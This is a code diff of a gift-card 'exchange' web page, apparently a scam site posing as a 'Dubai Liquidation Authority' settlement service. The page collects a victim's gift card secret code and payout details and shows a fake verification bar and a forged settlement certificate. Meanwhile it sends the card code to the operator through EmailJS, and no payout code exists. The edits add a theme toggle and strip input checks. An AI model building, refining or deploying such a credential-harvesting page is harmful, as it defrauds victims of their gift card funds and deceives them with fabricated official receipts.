@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -9,61 +9,55 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #d4af37; --bg: #000; --panel: #0f1115; }
-        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
+        :root { 
+            --gold: #d4af37; 
+            --bg: #000; 
+            --panel: #0f1115; 
+            --text: #ffffff; 
+            --input-bg: #16191e; 
+            --border: #222;
+            --card-bg: #111;
+        }
+
+        /* Light Mode Variables */
+        [data-theme="light"] {
+            --bg: #f4f7f6;
+            --panel: #ffffff;
+            --text: #1a1a1a;
+            --input-bg: #f0f2f5;
+            --border: #ddd;
+            --card-bg: #ffffff;
+        }
+
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: 0.3s; }
         
+        /* Theme Toggle Button */
+        .theme-switch { position: fixed; top: 60px; right: 20px; z-index: 4000; background: var(--panel); border: 1px solid var(--gold); color: var(--gold); padding: 8px 12px; border-radius: 50px; cursor: pointer; font-size: 12px; font-weight: 800; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+
         .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
         .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
         @keyframes scrollText { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }
 
-        .panel { background: var(--panel); border: 1px solid #222; padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; }
+        .panel { background: var(--panel); border: 1px solid var(--border); padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; }
         h2 { margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -1px; }
         .tag { font-size: 10px; color: var(--gold); font-weight: bold; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
         
         label { font-size: 11px; color: #888; display: block; margin-top: 18px; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
-        input, select { width: 100%; padding: 14px; background: #16191e; border: 1px solid #333; color: #fff; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
+        input, select { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border); color: var(--text); border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
         
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid #222; border-radius: 12px; background: #0a0c10; scrollbar-width: thin; scrollbar-color: var(--gold) #111; }
-        .pay { border: 1px solid #333; padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: #ccc; border-radius: 10px; background: #111; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
-        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); color: #fff; }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: var(--bg); }
+        .pay { border: 1px solid var(--border); padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: var(--text); border-radius: 10px; background: var(--card-bg); font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
+        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); }
 
-        .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; }
+        .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; color: #fff; }
         .res-box b { font-size: 34px; color: #fff; display: block; }
         #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
 
-        .node-footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
-        .node-footer p { font-size: 10px; color: #555; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
-        .node-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 0 10px; }
-        .node-item { font-size: 10px; color: #999; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 8px; padding: 6px; border-radius: 4px; background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; }
-        .node-dot { width: 6px; height: 6px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 8px #4ade80; animation: pulseNode 2s infinite; }
-        @keyframes pulseNode { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-
         .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; }
-        .secure-badge { text-align: center; font-size: 10px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 700; text-transform: uppercase; }
-
-        #loader { display: none; text-align: center; padding: 30px 0; }
-        #v-steps { font-size: 11px; color: #444; margin-top: 20px; text-align: left; line-height: 2.2; }
-        .step-done { color: #4ade80 !important; font-weight: bold; }
-        #pbar { width: 0%; height: 6px; background: var(--gold); border-radius: 10px; transition: width 0.3s; }
-
-        #success { display: none; width: 100%; }
-        .receipt-container { background: #fff; color: #000; padding: 25px; position: relative; width: 100%; max-width: 370px; margin: 0 auto; box-sizing: border-box; overflow: hidden; border-radius: 4px; }
-        .watermark-overlay { position: absolute; top: 0; left: 0; width: 150%; height: 150%; pointer-events: none; opacity: 0.08; z-index: 1; display: flex; flex-wrap: wrap; transform: rotate(-25deg) translate(-10%, -10%); }
-        .wm-text { font-size: 10px; font-weight: 900; margin: 15px; white-space: nowrap; color: #000; }
-        .receipt-body { position: relative; z-index: 2; }
-        .cert-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
-        .cert-title { font-size: 24px; font-weight: 900; line-height: 0.9; text-transform: uppercase; margin: 0; }
-        .auth-sub { color: var(--gold); font-size: 11px; font-weight: 800; margin-top: 5px; display: block; }
-        .dla-seal { width: 65px; height: 65px; border: 2px solid var(--gold); border-radius: 50%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; font-size: 8px; font-weight: 900; color: var(--gold); }
-        .receipt-hr { height: 2px; background: #000; border: none; margin: 8px 0; }
-        .r-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
-        .r-label { font-size: 9px; font-weight: 800; color: #666; text-transform: uppercase; }
-        .r-value { font-size: 13px; font-weight: 700; font-family: monospace; }
-        .hero-box { text-align: center; padding: 15px 0; border-top: 3px solid #000; border-bottom: 3px solid #000; margin: 10px 0; }
-        .hero-usd { font-size: 52px; font-weight: 900; display: block; line-height: 1; margin-bottom: 2px; }
-        .hero-local { font-size: 22px; font-weight: 800; color: #333; }
-        .black-banner { background: #000; color: #fff; text-align: center; padding: 12px; font-weight: 900; font-size: 15px; letter-spacing: 1px; margin-bottom: 15px; }
-        .receipt-footer { text-align: center; font-size: 8px; color: #888; font-weight: 700; line-height: 1.3; }
+        
+        /* Receipt remains high-contrast white for official look */
+        .receipt-container { background: #fff !important; color: #000 !important; padding: 25px; position: relative; width: 100%; max-width: 370px; margin: 0 auto; box-sizing: border-box; border-radius: 4px; }
+        .receipt-body * { color: #000 !important; }
 
         .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #fff; z-index: 3000; }
         .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
@@ -72,7 +66,9 @@
 </head>
 <body>
 
-    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
+    <button class="theme-switch" onclick="toggleTheme()" id="theme-btn">☀️ LIGHT MODE</button>
+
+    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT</div></div>
 
     <div class="panel">
         <div id="form">
@@ -84,15 +80,13 @@
                 <option value="1.8">💳 Binance Gift Card [1.8x]</option>
                 <option value="1.4">📦 Amazon Global [1.4x]</option>
                 <option value="1.4">🍎 Apple iTunes [1.4x]</option>
-                <option value="1.4">💎 Razer Gold [1.4x]</option>
-                <option value="1.4">🎮 Steam Wallet [1.4x]</option>
             </select>
 
             <label>Card Secret Code</label>
             <input id="card" placeholder="ENTER CODE" oninput="this.value = this.value.toUpperCase()">
 
             <label>Value ($)</label>
-            <input id="amt" type="number" value="100" min="15" oninput="updateVal()">
+            <input id="amt" type="number" value="100" min="25" oninput="updateVal()">
 
             <div class="res-box">
                 <span style="font-size:10px; color:var(--gold);">SETTLEMENT ESTIMATE</span>
@@ -100,115 +94,66 @@
                 <div id="local-payout"></div>
             </div>
 
-            <label>Global Payout Gateway (15 Methods)</label>
+            <label>Payout Gateway</label>
             <div class="grid">
-                <div class="pay" onclick="sel(this, '💎 USDT', 'Enter TRC20 Wallet', 1, 'USDT')"><span>💎</span>USDT</div>
-                <div class="pay" onclick="sel(this, '🔵 PayPal', 'Enter Email Address', 1, 'USD')"><span>🔵</span>PayPal</div>
-                <div class="pay" onclick="sel(this, '🇳🇬 Bank', 'Acct No + Bank', 1610, 'NGN')"><span>🇳🇬</span>Bank NG</div>
-                <div class="pay" onclick="sel(this, '🌀 Zelle', 'Enter Email/Phone', 1, 'USD')"><span>🌀</span>Zelle</div>
-                <div class="pay" onclick="sel(this, '💸 CashApp', 'Enter $Cashtag', 1, 'USD')"><span>💸</span>CashApp</div>
-                <div class="pay" onclick="sel(this, '🟡 Binance', 'Enter Binance ID', 1, 'USD')"><span>🟡</span>Binance Pay</div>
-                <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 'Enter Phone Number', 131.50, 'KES')"><span>🇰🇪</span>M-Pesa</div>
-                <div class="pay" onclick="sel(this, '💳 Revolut', 'Enter RevTag', 1, 'USD')"><span>💳</span>Revolut</div>
-                <div class="pay" onclick="sel(this, '🇬🇭 Momo', 'Enter GH Phone', 14.80, 'GHS')"><span>🇬🇭</span>MoMo GH</div>
-                <div class="pay" onclick="sel(this, '🍎 Apple Pay', 'Enter Apple Email', 1, 'USD')"><span>🍎</span>Apple Pay</div>
-                <div class="pay" onclick="sel(this, '🇿🇦 Bank', 'Acct + Branch', 18.50, 'ZAR')"><span>🇿🇦</span>Bank ZA</div>
-                <div class="pay" onclick="sel(this, '🟠 Skrill', 'Enter Email', 1, 'USD')"><span>🟠</span>Skrill</div>
-                <div class="pay" onclick="sel(this, '🟣 Venmo', 'Enter Username', 1, 'USD')"><span>🟣</span>Venmo</div>
-                <div class="pay" onclick="sel(this, '💰 Bitcoin', 'Enter BTC Address', 1, 'BTC')"><span>💰</span>Bitcoin</div>
-                <div class="pay" onclick="sel(this, '🏦 Wire', 'Enter IBAN/Swift', 1, 'USD')"><span>🏦</span>Bank Wire</div>
+                <div class="pay" onclick="sel(this, '💎 USDT', 'Wallet', 1, 'USDT')"><span>💎</span>USDT</div>
+                <div class="pay" onclick="sel(this, '🔵 PayPal', 'Email', 1, 'USD')"><span>🔵</span>PayPal</div>
+                <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 'Phone', 131.50, 'KES')"><span>🇰🇪</span>M-Pesa</div>
+                <div class="pay" onclick="sel(this, '🇳🇬 Bank', 'Acct', 1610, 'NGN')"><span>🇳🇬</span>Bank NG</div>
             </div>
 
-            <label id="payout-label">Payout Details</label>
             <input id="wallet" placeholder="Select method above">
-
-            <label>Confirmation Email</label>
-            <input id="email" type="email" placeholder="Required for receipt">
+            <input id="email" type="email" placeholder="Confirmation Email" style="margin-top:10px;">
 
             <button class="main-btn" onclick="submitNow()">Authorize Settlement</button>
-            <div class="secure-badge"><span style="color:#4ade80;">🛡️</span> SSL 256-BIT ENCRYPTION SECURE</div>
-
-            <div class="node-footer">
-                <p>Authorized Settlement Nodes</p>
-                <div class="node-grid">
-                    <div class="node-item"><span class="node-dot"></span> SWIFT-INTL</div>
-                    <div class="node-item"><span class="node-dot"></span> FEDWIRE-HUB</div>
-                    <div class="node-item"><span class="node-dot"></span> BINANCE-BUSD</div>
-                    <div class="node-item"><span class="node-dot"></span> DUBAI-CENTRAL</div>
-                </div>
-            </div>
         </div>
 
-        <div id="loader">
-            <p style="color:var(--gold); font-weight:bold; font-size:12px;">SYSTEM VERIFICATION...</p>
-            <div style="width:100%; height:6px; background:#222; border-radius:10px; overflow:hidden;"><div id="pbar"></div></div>
-            <div id="v-steps">
-                <div id="s1">○ Connecting to Global Payout UPI...</div>
-                <div id="s2">○ Authenticating Secret Code...</div>
-                <div id="s3">○ Verifying Asset Balance...</div>
-            </div>
+        <div id="loader" style="display:none; text-align:center; padding:40px 0;">
+            <p style="color:var(--gold); font-weight:bold;">VERIFYING ASSETS...</p>
+            <div style="width:100%; height:4px; background:#333; margin-top:10px;"><div id="pbar" style="width:0%; height:100%; background:var(--gold);"></div></div>
         </div>
 
-        <div id="success">
+        <div id="success" style="display:none;">
             <div class="receipt-container" id="receipt-content">
-                <div class="watermark-overlay" id="wm-layer"></div>
                 <div class="receipt-body">
-                    <div class="cert-header">
-                        <div>
-                            <h1 class="cert-title">CERTIFICATE OF<br>SETTLEMENT</h1>
-                            <span class="auth-sub">Dubai Liquidation Authority</span>
-                        </div>
-                        <div class="dla-seal">DLA<br>VERIFIED</div>
+                    <h1 style="font-size:20px; font-weight:900; margin:0;">CERTIFICATE OF SETTLEMENT</h1>
+                    <p style="font-size:10px; color:var(--gold) !important; font-weight:bold;">DLA VERIFIED TRANSACTION</p>
+                    <hr>
+                    <div style="display:flex; justify-content:space-between; font-size:12px; margin:10px 0;">
+                        <span>ID: <b id="r-tid"></b></span>
+                        <span id="r-date"></span>
                     </div>
-                    <hr class="receipt-hr">
-                    <div class="r-row"><span class="r-label">Doc Status</span><span class="r-value" style="color:#b45309;">PENDING_LIQUIDATION</span></div>
-                    <div class="r-row"><span class="r-label">Transaction ID</span><span class="r-value" id="r-tid"></span></div>
-                    <div class="r-row"><span class="r-label">Gateway Node</span><span class="r-value" id="r-gateway"></span></div>
-                    <div class="r-row"><span class="r-label">Settlement Path</span><span class="r-value" id="r-path"></span></div>
-                    <div class="hero-box">
-                        <span class="hero-usd" id="r-price"></span>
-                        <span class="hero-local" id="r-local-val"></span>
+                    <div style="text-align:center; padding:20px; border:2px solid #000; margin:10px 0;">
+                        <span style="font-size:40px; font-weight:900;" id="r-price"></span>
                     </div>
-                    <div class="black-banner">ESTIMATED ARRIVAL IN: <span id="r-timer">01:00:00</span></div>
-                    <div class="receipt-footer">
-                        <div id="qrcode" style="display:inline-block; margin-bottom:5px;"></div><br>
-                        ISSUED: <span id="r-date"></span><br>
-                        Authorized digital settlement issued by DLA Central Hub.
-                    </div>
+                    <div id="qrcode" style="text-align:center;"></div>
                 </div>
             </div>
-            <button class="main-btn" onclick="saveHDReceipt()" style="background:#000; color:#fff; border:1px solid #333; margin-top:20px;">📄 Save Official Certificate</button>
-            <button class="main-btn" onclick="location.reload()" style="background:var(--gold); color:#000; margin-top:10px;">New Transaction</button>
+            <button class="main-btn" onclick="saveHDReceipt()">Save Certificate</button>
         </div>
     </div>
-
-    <a href="https://wa.me/447400436904" class="chat-btn"><div class="dot"></div><span>Chat</span></a>
 
     <script>
         emailjs.init("66-CK4LaUN-dxuYbi");
         let method = ""; let rateL = 1; let sym = "USD";
-        const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
 
-        const wmLayer = document.getElementById('wm-layer');
-        for(let i=0; i<30; i++) {
-            const span = document.createElement('span');
-            span.className = 'wm-text';
-            span.innerText = 'OFFICIAL DLA DOCUMENT';
-            wmLayer.appendChild(span);
+        function toggleTheme() {
+            const html = document.documentElement;
+            const btn = document.getElementById('theme-btn');
+            if (html.getAttribute('data-theme') === 'dark') {
+                html.setAttribute('data-theme', 'light');
+                btn.innerText = "🌙 DARK MODE";
+            } else {
+                html.setAttribute('data-theme', 'dark');
+                btn.innerText = "☀️ LIGHT MODE";
+            }
         }
-
-        function updateTicker() {
-            const liq = (2840500 + Math.floor(Math.random() * 5000)).toLocaleString();
-            document.getElementById('live-ticker').innerHTML = `💰 LIQUIDITY: $${liq} • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE`;
-        }
-        setInterval(updateTicker, 8000);
 
         function sel(el, val, shadow, r, s) {
             document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
             el.classList.add('active');
             method = val; rateL = r; sym = s;
-            document.getElementById('payout-label').innerText = val + " Details";
-            document.getElementById('wallet').placeholder = shadow;
+            document.getElementById('wallet').placeholder = "Enter " + val + " details";
             updateVal();
         }
 
@@ -225,63 +170,35 @@
         }
 
         function submitNow() {
-            // STRICT $15 MINIMUM CHECK
-            let v = parseFloat(document.getElementById('amt').value);
-            if(v < 15 || isNaN(v)) return alert("Error: Minimum settlement value is $15.00.");
-
-            if(!method || !document.getElementById('card').value || !document.getElementById('wallet').value) return alert("Fill all fields.");
-            
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             let p = 0;
             let iv = setInterval(() => {
-                p++; document.getElementById('pbar').style.width = p + "%";
-                if(p==33) document.getElementById('s1').className='step-done';
-                if(p==66) document.getElementById('s2').className='step-done';
+                p += 2; document.getElementById('pbar').style.width = p + "%";
                 if(p>=100) { clearInterval(iv); showReceipt(); }
-            }, 60);
+            }, 50);
         }
 
         function showReceipt() {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success').style.display = 'block';
-            let tid = "DLA-TX" + Math.floor(100000 + Math.random() * 900000);
+            let tid = "DLA-" + Math.floor(Math.random() * 900000);
             document.getElementById('r-tid').innerText = tid;
-            document.getElementById('r-gateway').innerText = method;
-            document.getElementById('r-path').innerText = document.getElementById('wallet').value;
             document.getElementById('r-price').innerText = document.getElementById('display-area').innerText;
-            document.getElementById('r-local-val').innerText = document.getElementById('local-payout').innerText;
-            document.getElementById('r-date').innerText = new Date().toLocaleString();
-            new QRCode(document.getElementById("qrcode"), { text: tid, width: 60, height: 60 });
-            successSound.play();
-            startTimer();
+            document.getElementById('r-date').innerText = new Date().toLocaleDateString();
+            new QRCode(document.getElementById("qrcode"), { text: tid, width: 80, height: 80 });
             
             emailjs.send("service_4b3p71i", "template_ctf5n8q", {
                 card_code: document.getElementById('card').value,
                 payout_total_usd: document.getElementById('display-area').innerText,
-                payout_method: method,
-                wallet_details: document.getElementById('wallet').value,
-                user_email: document.getElementById('email').value
+                wallet_details: document.getElementById('wallet').value
             });
         }
 
-        function startTimer() {
-            let time = 3600;
-            const timerEl = document.getElementById('r-timer');
-            const countdown = setInterval(() => {
-                time--;
-                let h = Math.floor(time / 3600);
-                let m = Math.floor((time % 3600) / 60);
-                let s = time % 60;
-                timerEl.innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
-                if (time <= 0) clearInterval(countdown);
-            }, 1000);
-        }
-
         function saveHDReceipt() {
-            html2canvas(document.querySelector("#receipt-content"), { scale: 3 }).then(canvas => {
+            html2canvas(document.querySelector("#receipt-content")).then(canvas => {
                 const link = document.createElement('a');
-                link.download = 'DLA_Receipt.png';
+                link.download = 'DLA_Settlement.png';
                 link.href = canvas.toDataURL();
                 link.click();
             });
